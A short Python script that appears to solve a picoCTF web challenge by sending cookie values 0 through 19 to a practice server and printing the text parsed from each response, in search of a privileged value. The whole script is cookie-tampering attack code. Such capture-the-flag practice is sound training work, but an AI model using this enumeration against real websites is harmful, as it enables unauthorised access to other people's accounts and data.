import requests
url = "http://mercury.picoctf.net:29649/check"

for i in range(0, 20):
    text = str(i)
    cookies = {
        'name': text
    }

    r = requests.get(url, cookies=cookies)
    result = r.text.split(
        "<p style=\"text-align:center; font-size:30px;\"><b>")[1].split("</b>")[0]
    print("[+] Testing Cookie:{} | Result: {}".format(i, result))



